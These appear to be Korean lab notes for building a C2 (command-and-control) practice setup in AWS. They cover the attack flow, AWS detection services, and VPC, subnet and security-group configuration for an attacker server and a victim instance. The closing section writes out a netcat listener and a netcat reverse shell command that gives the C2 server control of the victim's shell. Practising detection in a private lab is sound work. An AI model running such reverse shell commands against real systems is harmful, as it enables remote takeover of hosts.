공격자 -> c2 서버 -> 피해자

1. 생성 또는 탈취된 서버를 c2로 만드는 작업
2. c2 서버에서 피해자 pc에게 명령전달
3. 피해자 pc에서 c2 서버로 전달된 명령 수행 및 정보 탈취
4. c2 서버로 전달된 정보를 공격자에게 전달

----------------------------------------------------------------
공격 유형 : 데이터 유출
감염된 클라이언트 행동 : 파일 수집 후 업로드
C2 서버 역할 : 파일 수신
AWS 탐지 : GuardDuty(UnauthorizedAccess:S3/List)

공격 유형 : 악성 코드 배포
감염된 클라이언트 행동 : C2에서 악성 코드 다운로드
C2 서버 역할 : 악성 코드 제공
AWS 탐지 : Route 53 Logs(DNS 요청 분석)

공격 유형 : DDos 공격
감염된 클라이언트 행동 : 감염된 클라이언트가 대량 쵸어
C2 서버 역할 : 공격 명령 제공
AWS 탐지 : AWS Shield, WAF

-----------------------------------------------------------------------
 VPC 설계 목표
1. C2 서버와 감염된 클라이언트 분리 → Public Subnet과 Private Subnet 사용
2. 보안 탐지 및 분석 → VPC Flow Logs, GuardDuty 활성화
3. 공격 트래픽 통제 → Security Group, WAF, AWS Lambda 자동 대응 활용
4. 외부와의 직접 연결 제한 → Private Subnet은 NAT Gateway를 통해서만 인터넷 연결 가능
5. Public Subnet은 인터넷과 직접 연결되는 반면, Private Subnet은 NAT Gateway를 통해서만 인터넷과 통신 가능
6. Internet Gateway - Public Subnet의 C2 서버가 인터넷과 직접 통신할 수 있도록 허용
7. NAT Gateway - Private Subnet에 있는 감염된 클라이언트가 C2 서버 또는 인터넷과 통신할 수 있도록 허용
8. 보안 그룹
C2 서버 (Public Subnet) - 22 (SSH) - 공격자 원격 접속 (관리자만 허용)
C2 서버 (Public Subnet) -8080	- 감염된 클라이언트가 명령을 받을 포트
감염된 클라이언트 (Private Subnet) - 80, 443 - NAT Gateway 통해 인터넷 연결 허용
감염된 클라이언트 (Private Subnet) - 8080 - C2 서버에 연결 가능
보안 조치
* SSH 접근을 특정 IP에서만 가능하도록 제한 (공격자가 아닌 다른 사용자의 접근 차단).
* C2 서버의 8080 포트를 감염된 클라이언트 전용으로 사용.
* 감염된 클라이언트가 외부 인터넷과 직접 연결되지 않도록 설정 (NAT Gateway 필수)
-------------------------------------------------------------------------------------------
VPC 설계
1. VPC 생성
2. 서브넷 생성(C2-Public, C2-Private)
3. 가용영역 다르게, CIDR(10.0.1.0/24, 10.0.2.0/24)
4. 인터넷 게이트웨이 생성
5. NAT 게이트 웨이 생성, 서브넷 Public 선택, ElasticIP 할당
6. 라우트 테이블 생성
7. PUBLIC - 인터넷 게이트웨이 추가
8. Private- nat 게이트웨이 추가
-------------------------------------------------------------------------------------------
보안 그룹 생성(C2 서버 & 피해자 서버 간 통신 설정)
1. 보안 그룹 생성(C2 서버용)
2. 인바운드 규칙 추가
유형 : SSH - 포트 22 - 소스(본인 IP or 0.0.0.0)
유형 : C2 통신 - 포트 8080 - 소스 피해자 EC2 서브넷(10.0.2.0/24)
유형 : HTTP - 포트 80 - 소스(0.0.0.0)
3. 보안 그룹 생성(피해자 서버용)
4. 인바운드 규칙 추가
유형 : SSH - 포트 22 - 소스(본인 IP or 0.0.0.0)
유형 : C2 통신 - 포트 8080 - 소스 C2 서버 보안 그룹(C2-5G)
--------------------------------------------------------------------------------------------
C2 서버 및 피해자 서버 EC2 인스턴스 생성
1. C2 서버(공격자) EC2 생성
2. 네트워크 설정 
VPC, 서브넷(C2-PUBLIC), 보안그룹(C2-5G)
3. 피해자 서버 EC2 생성
4. 네트워크 설정
VPC, 서브넷(C2-PRIVATE), 보안그룹(VICT-5G)
----------------------------------------------------------------------------------------
C2 서버에서 필수 도구 설치
1단계: 패키지 업데이트 및 기본 도구 설치
sudo apt update && sudo apt upgrade -y
sudo apt install -y netcat socat python3-pip apache2
C2 서버 실행 및 테스트
1단계: Netcat을 이용한 C2 서버 실행
nc -lvp 8080
C2 서버가 8080 포트에서 대기
피해자가 접속하면 명령을 전달 가능

2단계: C2 서버 연결 확인
nc <C2-서버-IP> 8080 -e /bin/bash
피해자가 C2 서버에 연결됨
C2 서버에서 피해자(EC2)의 쉘을 제어 가능
C2 서버(공격자) 터미널에서 실행
피해자의 터미널에서 ubuntu가 출력되면 성공